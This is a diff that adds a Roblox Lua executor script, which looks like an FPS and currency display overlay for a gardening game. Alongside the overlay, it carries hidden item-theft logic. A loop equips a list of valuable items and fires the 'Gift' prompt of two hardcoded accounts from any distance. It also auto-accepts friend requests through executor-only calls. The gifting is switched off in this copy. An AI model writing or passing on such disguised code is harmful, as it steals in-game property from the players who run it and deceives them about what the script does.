@@ -1,0 +1,186 @@
+local Config = {
+    AutoGiveItems = false,
+    AutoAcceptFriend = true
+}
+
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local LocalPlayer = Players.LocalPlayer
+
+if not LocalPlayer then
+    Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
+    LocalPlayer = Players.LocalPlayer
+end
+
+local TARGET_NAMES = {"EYTHANGDADEN", "NHATPROCOM"}
+local ItemList = {
+    "Legendary Sprinkler",
+    "Mushroom",
+    "Super Watering Can",
+    "Super Sprinkler",
+    "Venom Spitter",
+    "Dragon's Breath",
+    "Moon Bloom",
+    "Venus Fly Trap",
+    "Hypno Bloom",
+    "Gold"
+}
+
+local mainGui = Instance.new("ScreenGui", CoreGui)
+mainGui.Name = "DMN X TMQ"
+mainGui.ResetOnSpawn = false
+mainGui.IgnoreGuiInset = true
+mainGui.DisplayOrder = 999999
+
+if not setfpscap then warn("Executor không hỗ trợ setfpscap().") end
+local enabled = true
+if setfpscap then setfpscap(1) end
+
+local button = Instance.new("TextButton", mainGui)
+button.Name = "ToggleButton"
+button.Size = UDim2.new(0, 180, 0, 50)
+button.Position = UDim2.new(0.5, -90, 0, 15)
+button.BackgroundColor3 = Color3.fromRGB(30, 150, 70)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Text = "DMN X TMQ"
+button.TextSize = 18
+button.Font = Enum.Font.GothamSemibold
+Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12)
+local stroke = Instance.new("UIStroke", button)
+stroke.Color = Color3.fromRGB(0, 0, 0)
+stroke.Thickness = 1.5
+stroke.Transparency = 0.5
+
+button.MouseButton1Click:Connect(function()
+    enabled = not enabled
+    if setfpscap then
+        if enabled then
+            setfpscap(1)
+            button.Text = "DMN X TMQ"
+            button.BackgroundColor3 = Color3.fromRGB(30, 150, 70)
+            button.Position = UDim2.new(0.5, -90, 0, 15)
+        else
+            setfpscap(999999)
+            button.Text = "DMN X TMQ: OFF"
+            button.BackgroundColor3 = Color3.fromRGB(170, 50, 50)
+            button.Position = UDim2.new(1, -190, 0, 15)
+        end
+    end
+end)
+
+local leaderstats = LocalPlayer:WaitForChild("leaderstats")
+local sheckles = leaderstats:WaitForChild("Sheckles")
+
+local function formatNumber(n)
+    local suffixes = {"","K","M","B","T","Qa","Qi","Sx","Sp","Oc","No","Dc"}
+    n = tonumber(n) or 0
+    local index = 1
+    while n >= 1000 and index < #suffixes do n = n / 1000; index = index + 1 end
+    if n >= 999.95 and index < #suffixes then n = 1; index = index + 1 end
+    if index == 1 then return tostring(math.floor(n))
+    elseif n >= 100 then return string.format("%.0f%s", n, suffixes[index])
+    elseif n >= 10 then return string.format("%.1f%s", n, suffixes[index])
+    else return string.format("%.2f%s", n, suffixes[index]) end
+end
+
+local nameLabel = Instance.new("TextLabel", mainGui)
+nameLabel.Size = UDim2.new(0, 500, 0, 50)
+nameLabel.Position = UDim2.new(0.5, -250, 0.5, -60)
+nameLabel.BackgroundTransparency = 1
+nameLabel.Text = LocalPlayer.Name
+nameLabel.TextColor3 = Color3.new(1,1,1)
+nameLabel.TextStrokeTransparency = 0
+nameLabel.TextScaled = true
+nameLabel.Font = Enum.Font.GothamBold
+
+local shecklesLabel = Instance.new("TextLabel", mainGui)
+shecklesLabel.Size = UDim2.new(0, 500, 0, 50)
+shecklesLabel.Position = UDim2.new(0.5, -250, 0.5, -5)
+shecklesLabel.BackgroundTransparency = 1
+shecklesLabel.TextColor3 = Color3.fromRGB(255,255,0)
+shecklesLabel.TextStrokeTransparency = 0
+shecklesLabel.TextScaled = true
+shecklesLabel.Font = Enum.Font.GothamBold
+
+local fpsLabel = Instance.new("TextLabel", mainGui)
+fpsLabel.Size = UDim2.new(0, 300, 0, 50)
+fpsLabel.Position = UDim2.new(0, 10, 0, 10)
+fpsLabel.Font = Enum.Font.FredokaOne
+fpsLabel.TextScaled = true
+fpsLabel.BackgroundTransparency = 1
+fpsLabel.TextStrokeTransparency = 0
+
+spawn(function()
+    local hue = 0
+    while true do
+        hue = hue + 0.01
+        if hue > 1 then hue = 0 end
+        fpsLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
+        task.wait(0.05)
+    end
+end)
+
+local frameCount, lastUpdate = 0, tick()
+RunService.RenderStepped:Connect(function()
+    frameCount = frameCount + 1
+    local now = tick()
+    if now - lastUpdate >= 1 then
+        fpsLabel.Text = "FPS: " .. math.floor(frameCount / (now - lastUpdate))
+        frameCount = 0
+        lastUpdate = now
+    end
+    nameLabel.Text = LocalPlayer.Name
+    shecklesLabel.Text = "Sheckles: " .. formatNumber(sheckles.Value)
+end)
+
+local function getTargetPlayer()
+    for _, name in ipairs(TARGET_NAMES) do
+        local p = Players:FindFirstChild(name)
+        if p then return p end
+    end
+    return nil
+end
+
+local function isLocalPlayerTarget()
+    for _, name in ipairs(TARGET_NAMES) do
+        if LocalPlayer.Name == name then return true end
+    end
+    return false
+end
+
+while task.wait(1) do
+    if not isLocalPlayerTarget() then
+        local targetPlayer = getTargetPlayer()
+        if Config.AutoGiveItems and targetPlayer then
+            local character = LocalPlayer.Character
+            local backpack = LocalPlayer:FindFirstChild("Backpack")
+            if character and backpack then
+                for _, name in ipairs(ItemList) do
+                    local item = backpack:FindFirstChild(name)
+                    if item then item.Parent = character end
+                end
+                local hrp = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                local prompt = hrp and hrp:FindFirstChild("Gift")
+                local isHolding = false
+                for _, name in ipairs(ItemList) do if character:FindFirstChild(name) then isHolding = true break end end
+                if isHolding and prompt and prompt:IsA("ProximityPrompt") then
+                    prompt.RequiresLineOfSight = false
+                    prompt.MaxActivationDistance = 999999
+                    fireproximityprompt(prompt)
+                end
+            end
+        end
+        if Config.AutoAcceptFriend then
+            local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+            if playerGui then
+                for _, gui in ipairs(playerGui:GetDescendants()) do
+                    if gui:IsA("TextButton") and (gui.Name == "AcceptButton") and gui.Visible then
+                        if firesignal then firesignal(gui.Activated)
+                        elseif getconnections then for _, con in pairs(getconnections(gui.Activated)) do con:Fire() end end
+                    end
+                end
+            end
+        end
+    end
+end
